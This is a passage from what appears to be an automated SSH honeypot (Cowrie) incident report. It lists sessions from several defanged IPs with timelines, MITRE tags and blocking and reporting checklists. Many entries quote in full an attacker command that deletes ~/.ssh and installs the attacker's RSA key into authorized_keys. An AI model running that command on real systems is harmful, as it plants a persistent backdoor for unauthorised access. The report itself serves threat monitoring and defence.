| `2026-04-14 12:12:06` | `cowrie.command.failed` |
| `2026-04-14 12:12:06` | `cowrie.log.closed` |
| `2026-04-14 12:12:06` | `cowrie.session.params` |
| `2026-04-14 12:12:06` | `cowrie.command.input` |
| `2026-04-14 12:12:06` | `cowrie.session.file_download` |
| `2026-04-14 12:12:06` | `cowrie.log.closed` |
| `2026-04-14 12:12:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e6ca8961cde

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-14 12:12 |
| **Last Seen** | 2026-04-14 12:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:12:09` | `cowrie.session.connect` |
| `2026-04-14 12:12:09` | `cowrie.client.version` |
| `2026-04-14 12:12:09` | `cowrie.client.kex` |
| `2026-04-14 12:12:09` | `cowrie.login.success` |
| `2026-04-14 12:12:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fabbf41251c0

| Field | Detail |
|---|---|
| **Source IP** | `34.85.163[.]94` |
| **First Seen** | 2026-04-14 12:12 |
| **Last Seen** | 2026-04-14 12:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:12:35` | `cowrie.session.connect` |
| `2026-04-14 12:12:35` | `cowrie.client.version` |
| `2026-04-14 12:12:36` | `cowrie.client.kex` |
| `2026-04-14 12:12:37` | `cowrie.login.success` |
| `2026-04-14 12:12:37` | `cowrie.session.params` |
| `2026-04-14 12:12:37` | `cowrie.command.input` |
| `2026-04-14 12:12:37` | `cowrie.command.failed` |
| `2026-04-14 12:12:37` | `cowrie.log.closed` |
| `2026-04-14 12:12:38` | `cowrie.session.params` |
| `2026-04-14 12:12:38` | `cowrie.command.input` |
| `2026-04-14 12:12:38` | `cowrie.session.file_download` |
| `2026-04-14 12:12:38` | `cowrie.log.closed` |
| `2026-04-14 12:12:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.85.163[.]94` to AbuseIPDB if not already reported
- [ ] Block `34.85.163[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f022eebe4f13

| Field | Detail |
|---|---|
| **Source IP** | `34.85.163[.]94` |
| **First Seen** | 2026-04-14 12:12 |
| **Last Seen** | 2026-04-14 12:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:12:41` | `cowrie.session.connect` |
| `2026-04-14 12:12:41` | `cowrie.client.version` |
| `2026-04-14 12:12:42` | `cowrie.client.kex` |
| `2026-04-14 12:12:43` | `cowrie.login.success` |
| `2026-04-14 12:12:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.85.163[.]94` to AbuseIPDB if not already reported
- [ ] Block `34.85.163[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-804adde48900

| Field | Detail |
|---|---|
| **Source IP** | `119.18.55[.]118` |
| **First Seen** | 2026-04-14 12:14 |
| **Last Seen** | 2026-04-14 12:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:14:45` | `cowrie.session.connect` |
| `2026-04-14 12:14:45` | `cowrie.client.version` |
| `2026-04-14 12:14:45` | `cowrie.client.kex` |
| `2026-04-14 12:14:45` | `cowrie.login.success` |
| `2026-04-14 12:14:45` | `cowrie.session.params` |
| `2026-04-14 12:14:45` | `cowrie.command.input` |
| `2026-04-14 12:14:45` | `cowrie.command.failed` |
| `2026-04-14 12:14:45` | `cowrie.log.closed` |
| `2026-04-14 12:14:45` | `cowrie.session.params` |
| `2026-04-14 12:14:45` | `cowrie.command.input` |
| `2026-04-14 12:14:45` | `cowrie.session.file_download` |
| `2026-04-14 12:14:45` | `cowrie.log.closed` |
| `2026-04-14 12:14:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.18.55[.]118` to AbuseIPDB if not already reported
- [ ] Block `119.18.55[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce7e906e00c5

| Field | Detail |
|---|---|
| **Source IP** | `119.18.55[.]118` |
| **First Seen** | 2026-04-14 12:14 |
| **Last Seen** | 2026-04-14 12:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:14:46` | `cowrie.session.connect` |
| `2026-04-14 12:14:46` | `cowrie.client.version` |
| `2026-04-14 12:14:46` | `cowrie.client.kex` |
| `2026-04-14 12:14:47` | `cowrie.login.success` |
| `2026-04-14 12:14:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.18.55[.]118` to AbuseIPDB if not already reported
- [ ] Block `119.18.55[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a4200ec525f

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-14 12:16 |
| **Last Seen** | 2026-04-14 12:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:16:54` | `cowrie.session.connect` |
| `2026-04-14 12:16:54` | `cowrie.client.version` |
| `2026-04-14 12:16:54` | `cowrie.client.kex` |
| `2026-04-14 12:16:55` | `cowrie.login.success` |
| `2026-04-14 12:16:55` | `cowrie.session.params` |
| `2026-04-14 12:16:55` | `cowrie.command.input` |
| `2026-04-14 12:16:55` | `cowrie.command.failed` |
| `2026-04-14 12:16:55` | `cowrie.log.closed` |
| `2026-04-14 12:16:56` | `cowrie.session.params` |
| `2026-04-14 12:16:56` | `cowrie.command.input` |
| `2026-04-14 12:16:56` | `cowrie.session.file_download` |
| `2026-04-14 12:16:56` | `cowrie.log.closed` |
| `2026-04-14 12:16:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc6558156361

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-14 12:16 |
| **Last Seen** | 2026-04-14 12:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:16:58` | `cowrie.session.connect` |
| `2026-04-14 12:16:58` | `cowrie.client.version` |
| `2026-04-14 12:16:58` | `cowrie.client.kex` |
| `2026-04-14 12:16:59` | `cowrie.login.success` |
| `2026-04-14 12:16:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9f0c533b16f

| Field | Detail |
|---|---|
| **Source IP** | `45.169.128[.]70` |
| **First Seen** | 2026-04-14 12:18 |
| **Last Seen** | 2026-04-14 12:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:18:07` | `cowrie.session.connect` |
| `2026-04-14 12:18:07` | `cowrie.client.version` |
| `2026-04-14 12:18:07` | `cowrie.client.kex` |
| `2026-04-14 12:18:08` | `cowrie.login.success` |
| `2026-04-14 12:18:09` | `cowrie.session.params` |
| `2026-04-14 12:18:09` | `cowrie.command.input` |
| `2026-04-14 12:18:09` | `cowrie.command.failed` |
| `2026-04-14 12:18:09` | `cowrie.log.closed` |
| `2026-04-14 12:18:10` | `cowrie.session.params` |
| `2026-04-14 12:18:10` | `cowrie.command.input` |
| `2026-04-14 12:18:10` | `cowrie.session.file_download` |
| `2026-04-14 12:18:10` | `cowrie.log.closed` |
| `2026-04-14 12:18:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.169.128[.]70` to AbuseIPDB if not already reported
- [ ] Block `45.169.128[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d15542134e69

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-14 12:18 |
| **Last Seen** | 2026-04-14 12:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:18:10` | `cowrie.session.connect` |
| `2026-04-14 12:18:10` | `cowrie.client.version` |
| `2026-04-14 12:18:10` | `cowrie.client.kex` |
| `2026-04-14 12:18:10` | `cowrie.login.success` |
| `2026-04-14 12:18:11` | `cowrie.session.params` |
| `2026-04-14 12:18:11` | `cowrie.command.input` |
| `2026-04-14 12:18:11` | `cowrie.command.failed` |
| `2026-04-14 12:18:11` | `cowrie.log.closed` |
| `2026-04-14 12:18:11` | `cowrie.session.params` |
| `2026-04-14 12:18:11` | `cowrie.command.input` |
| `2026-04-14 12:18:11` | `cowrie.session.file_download` |
| `2026-04-14 12:18:11` | `cowrie.log.closed` |
| `2026-04-14 12:18:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca5a0a40ac6e

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-14 12:18 |
| **Last Seen** | 2026-04-14 12:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:18:14` | `cowrie.session.connect` |
| `2026-04-14 12:18:14` | `cowrie.client.version` |
| `2026-04-14 12:18:14` | `cowrie.client.kex` |
| `2026-04-14 12:18:14` | `cowrie.login.success` |
| `2026-04-14 12:18:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6ff5957ab1f

| Field | Detail |
|---|---|
| **Source IP** | `45.169.128[.]70` |
| **First Seen** | 2026-04-14 12:18 |
| **Last Seen** | 2026-04-14 12:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:18:14` | `cowrie.session.connect` |
| `2026-04-14 12:18:14` | `cowrie.client.version` |
| `2026-04-14 12:18:14` | `cowrie.client.kex` |
| `2026-04-14 12:18:16` | `cowrie.login.success` |
| `2026-04-14 12:18:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.169.128[.]70` to AbuseIPDB if not already reported
- [ ] Block `45.169.128[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df51a7006e79

| Field | Detail |
|---|---|
| **Source IP** | `20.255.56[.]84` |
| **First Seen** | 2026-04-14 12:18 |
| **Last Seen** | 2026-04-14 12:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:18:58` | `cowrie.session.connect` |
| `2026-04-14 12:18:58` | `cowrie.client.version` |
| `2026-04-14 12:18:58` | `cowrie.client.kex` |
| `2026-04-14 12:18:58` | `cowrie.login.success` |
| `2026-04-14 12:18:58` | `cowrie.session.params` |
| `2026-04-14 12:18:58` | `cowrie.command.input` |
| `2026-04-14 12:18:58` | `cowrie.command.failed` |
| `2026-04-14 12:18:59` | `cowrie.log.closed` |
| `2026-04-14 12:18:59` | `cowrie.session.params` |
| `2026-04-14 12:18:59` | `cowrie.command.input` |
| `2026-04-14 12:18:59` | `cowrie.session.file_download` |
| `2026-04-14 12:18:59` | `cowrie.log.closed` |
| `2026-04-14 12:19:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.255.56[.]84` to AbuseIPDB if not already reported
- [ ] Block `20.255.56[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-660432bec099

| Field | Detail |
|---|---|
| **Source IP** | `20.255.56[.]84` |
| **First Seen** | 2026-04-14 12:19 |
| **Last Seen** | 2026-04-14 12:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:19:01` | `cowrie.session.connect` |
| `2026-04-14 12:19:01` | `cowrie.client.version` |
| `2026-04-14 12:19:01` | `cowrie.client.kex` |
| `2026-04-14 12:19:01` | `cowrie.login.success` |
| `2026-04-14 12:19:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.255.56[.]84` to AbuseIPDB if not already reported
- [ ] Block `20.255.56[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e359d4502a27

| Field | Detail |
|---|---|
| **Source IP** | `34.85.163[.]94` |
| **First Seen** | 2026-04-14 12:25 |
| **Last Seen** | 2026-04-14 12:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:25:14` | `cowrie.session.connect` |
| `2026-04-14 12:25:14` | `cowrie.client.version` |
| `2026-04-14 12:25:14` | `cowrie.client.kex` |
| `2026-04-14 12:25:15` | `cowrie.login.success` |
| `2026-04-14 12:25:16` | `cowrie.session.params` |
| `2026-04-14 12:25:16` | `cowrie.command.input` |
| `2026-04-14 12:25:16` | `cowrie.command.failed` |
| `2026-04-14 12:25:16` | `cowrie.log.closed` |
| `2026-04-14 12:25:17` | `cowrie.session.params` |
| `2026-04-14 12:25:17` | `cowrie.command.input` |
| `2026-04-14 12:25:17` | `cowrie.session.file_download` |
| `2026-04-14 12:25:17` | `cowrie.log.closed` |
| `2026-04-14 12:25:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.85.163[.]94` to AbuseIPDB if not already reported
- [ ] Block `34.85.163[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8264ac313d4b

| Field | Detail |
|---|---|
| **Source IP** | `34.85.163[.]94` |
| **First Seen** | 2026-04-14 12:25 |
| **Last Seen** | 2026-04-14 12:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:25:20` | `cowrie.session.connect` |
| `2026-04-14 12:25:20` | `cowrie.client.version` |
| `2026-04-14 12:25:20` | `cowrie.client.kex` |
| `2026-04-14 12:25:21` | `cowrie.login.success` |
| `2026-04-14 12:25:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.85.163[.]94` to AbuseIPDB if not already reported
- [ ] Block `34.85.163[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbb125dd44f1

| Field | Detail |
|---|---|
| **Source IP** | `45.169.128[.]70` |
| **First Seen** | 2026-04-14 12:25 |
| **Last Seen** | 2026-04-14 12:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:25:51` | `cowrie.session.connect` |
| `2026-04-14 12:25:51` | `cowrie.client.version` |
| `2026-04-14 12:25:51` | `cowrie.client.kex` |
| `2026-04-14 12:25:53` | `cowrie.login.success` |
| `2026-04-14 12:25:53` | `cowrie.session.params` |
| `2026-04-14 12:25:53` | `cowrie.command.input` |
| `2026-04-14 12:25:53` | `cowrie.command.failed` |
| `2026-04-14 12:25:54` | `cowrie.log.closed` |
| `2026-04-14 12:25:54` | `cowrie.session.params` |
| `2026-04-14 12:25:54` | `cowrie.command.input` |
| `2026-04-14 12:25:55` | `cowrie.session.file_download` |
| `2026-04-14 12:25:55` | `cowrie.log.closed` |
| `2026-04-14 12:26:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.169.128[.]70` to AbuseIPDB if not already reported
- [ ] Block `45.169.128[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a1527ca6cf7

| Field | Detail |
|---|---|
| **Source IP** | `45.169.128[.]70` |
| **First Seen** | 2026-04-14 12:25 |
| **Last Seen** | 2026-04-14 12:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:25:58` | `cowrie.session.connect` |
| `2026-04-14 12:25:58` | `cowrie.client.version` |
| `2026-04-14 12:25:59` | `cowrie.client.kex` |
| `2026-04-14 12:26:00` | `cowrie.login.success` |
| `2026-04-14 12:26:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.169.128[.]70` to AbuseIPDB if not already reported
- [ ] Block `45.169.128[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2767bef8ec34

| Field | Detail |
